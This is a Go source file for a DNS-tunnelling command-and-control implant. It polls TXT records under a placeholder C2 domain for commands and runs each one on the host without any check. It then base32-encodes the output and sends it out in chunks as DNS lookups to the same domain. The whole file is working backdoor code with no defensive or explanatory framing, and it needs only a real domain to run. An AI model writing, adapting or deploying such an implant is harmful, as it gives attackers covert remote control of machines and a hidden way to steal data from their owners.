package main

import (
	"encoding/base32"
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"strings"
	"time"
)

const payloadSizeMax = 62 //
const c2Domain = "your.c2.here"

func main() {
	//infinite loop
	for {
		cmd, uid := lookupCommand()
		if cmd != "NoCMD" {
			go handleCommand(cmd, uid)
		}
		v := rand.Intn(10000)
		time.Sleep(time.Millisecond * time.Duration(v))
	}

	//wait for 1..10 seconds
}

func lookupCommand() (string, string) {
	//generate random uid
	uid := RandStringRunes(4)
	lookupAddr := fmt.Sprintf("%s.%s", uid, c2Domain)
	command, err := net.LookupTXT(lookupAddr)
	if err != nil {
		panic(err)
	}
	return command[0], uid
}

func handleCommand(c, uid string) {
	//execute command in system
	cmds := strings.Split(c, " ")
	p := exec.Command(cmds[0], cmds[1:]...)
	result, e := p.Output()
	if e != nil {
		result = []byte(e.Error())
	}
	//get output of command
	//work out how many blocks need to be sent to the c2
	encodedResult := base32.HexEncoding.EncodeToString(result)
	encodedResult = strings.Replace(encodedResult, "=", "-", -1)
	blocks := len(encodedResult) / payloadSizeMax
	leftover := len(encodedResult) % payloadSizeMax
	if leftover > 0 {
		blocks++
	}
	//fmt.Printf("sending %d chunks\n", blocks)
	for x := 1; x <= blocks; x++ {
		minVal := (x - 1) * payloadSizeMax
		maxVal := x * payloadSizeMax
		if maxVal > len(encodedResult) {
			maxVal = len(encodedResult)
		}
		payload := encodedResult[minVal:maxVal]
		chunknumber := x
		maxChunks := blocks
		lookupaddr := fmt.Sprintf("%s.%d.%d.%s.%s", payload, chunknumber, maxChunks, uid, c2Domain)
		go net.LookupIP(lookupaddr)

	}
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []byte("abcdefghijklmnopqrstuvwxyz1234567890")

func RandStringRunes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
